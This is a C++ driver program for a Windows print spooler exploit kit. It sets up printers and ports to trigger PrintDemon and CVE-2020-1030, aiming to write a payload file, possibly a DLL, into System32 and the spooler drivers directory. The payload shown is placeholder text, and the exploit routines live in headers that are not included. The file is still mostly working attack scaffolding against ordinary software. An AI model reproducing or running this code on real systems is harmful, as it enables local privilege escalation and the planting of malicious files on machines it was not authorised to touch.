#include <iostream>
#include <Windows.h>

#include "printers.h"
#include "utils.h"; 
#include "exploits.h"

struct PrinterExploitInfo {
	wchar_t *driverName, *portName, *printerName; 
	PrinterExploitInfo(wchar_t* driverName, wchar_t* portName, wchar_t* printerName)
		: driverName(driverName), portName(portName), printerName(printerName) {}
};

int main(int argc, wchar_t* argv[]) {
	
	bool isRestarted = isAppStartedFromReboot(argc, argv); 

	// PrintDemon 
	PrinterExploitInfo printDemonInfo(
		const_cast<wchar_t*>(L"Generic / Text Only"),
		const_cast<wchar_t*>(L"C:\\Windows\\System32\\Port.txt"),
		const_cast<wchar_t*>(L"print_demon printer")); 
	
	if (!isRestarted) {
		HRESULT driverResult = AddDriver(printDemonInfo.driverName);
		DWORD portResult = AddPort(printDemonInfo.portName);
		HANDLE hPrinter = AddPrinter(printDemonInfo.printerName, printDemonInfo.driverName, printDemonInfo.portName);
		ClosePrinter(hPrinter);
	}

	std::string payload = "Hello, PrintDemon"; 
	print_demon(printDemonInfo.printerName, payload, isRestarted); 

	// cve_2020_1030 
	PrinterExploitInfo cve_2020_1030Info(
		const_cast<wchar_t*>(L"Microsoft Print To PDF"),
		const_cast<wchar_t*>(L"PORTPROMPT:"),
		const_cast<wchar_t*>(L"cve_2020_1030 printer"));

	if (!isRestarted) {
		HRESULT driverResult = AddDriver(cve_2020_1030Info.driverName);
		DWORD portResult = AddPort(cve_2020_1030Info.portName);
		HANDLE hPrinter = AddPrinter(cve_2020_1030Info.printerName, cve_2020_1030Info.driverName, cve_2020_1030Info.portName);
		ClosePrinter(hPrinter);
	}
	wchar_t* filePath = const_cast<wchar_t*>(L"C:\\Users\\User\\Desktop\\payload.txt"); // can also be .dll 
	// std::string fileName = "cve_2020_1030.txt"; // file to insert inside C:\Windows\System32\spool\drivers\x64\4
	cve_2020_1030(cve_2020_1030Info.printerName, filePath, isRestarted); 

	return 0; 
}